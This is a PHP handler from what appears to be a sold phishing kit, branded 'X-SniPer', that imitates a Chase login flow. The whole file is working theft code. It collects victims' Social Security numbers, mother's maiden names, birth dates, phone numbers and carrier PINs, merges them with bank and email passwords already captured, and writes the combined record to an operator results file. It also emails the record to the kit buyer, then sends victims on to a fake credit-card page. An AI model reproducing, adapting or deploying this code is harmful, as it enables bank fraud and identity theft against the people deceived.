<?php 



require("require.php");

if (isset($_POST['SSN']) && isset($_POST['mdn']) ) {
	if (!empty($_POST['SSN']) && !empty($_POST['mdn']) ) {
		
			// Admin Panel
			$_SESSION['SSN'] = $_POST['SSN'];
			$_SESSION['mdn'] = $_POST['mdn'];
			$_SESSION['dob'] = $_POST['dob'];
			$_SESSION['phone'] = $_POST['phone'];
			$_SESSION['carrier'] = $_POST['carrier'];



			$msgAdminPanel = "<tr>";
			$msgAdminPanel .= "<td>".$_SESSION['userId']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['password']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['Email']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['passwordEmail']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['SSN']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['mdn']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['dob']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['phone']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['carrier']."</td>";
			$msgAdminPanel .= "<td>".$ip." </td>";
			$msgAdminPanel .= "<td>".$date."</td>";
			$msgAdminPanel .= "</tr>". "\r\n";


			$Subject = "❤️💪 X-SniPer ".$arrangement." Info Chase 💪❤️  [".$_POST['SSN']."] ip 👉".$ip;
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "From: ".$YourName." <ElZero@xSniper.com>" . "\r\n";
	        $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";

	        $msg = "#===========||<".$YourName.">||==========#\n";
	        $msg .= "#===========||<X-SniPer Page>||==========//\n";
	        $msg .= "UserID   		: ".$_SESSION['userId']." \n";
	        $msg .= "Password 		: ".$_SESSION['password']." \n";
	        $msg .= "#===========||<Email Access>||==========//\n";
	        $msg .= "Email Access   : ".$_SESSION['Email']." \n";
	        $msg .= "Password 		: ".$_SESSION['passwordEmail']." \n";
	        $msg .= "#===========||< info Login >||==========//\n";
	        $msg .= "SSN 		    : ".$_SESSION['SSN']." \n";
	        $msg .= "MMN  			: ".$_SESSION['mdn']." \n";
	        $msg .= "Date of Birth 	: ".$_SESSION['dob']." \n";
	        $msg .= "phone Number	: ".$_SESSION['phone']." \n";
	        $msg .= "carrier PIN	: ".$_SESSION['carrier']." \n";
	        $msg .= "IP 	  		: ".$ip."//\n";
	        $msg .= "#===========||<Thanks For Buying>||========//\n";


	        if ($saveInAdminPanel  == "true") {
				$file = fopen("../../admin/result/info.txt", "a+");
				fwrite($file, $msgAdminPanel);
				
				
			}
			
			if ($sendToEmail == "true") {
				
				send($yourEmail, $Subject, $msg);

			}

			header("Location: ../../secure/credit?country=us&id=chase");exit();
			



		
	}else{
		header("Location: ../../secure/info?id=chase&invalid&country=us");exit();
	}
}else{
	header("Location: ../../secure/info?id=chase&invalid&country=us");exit();
}
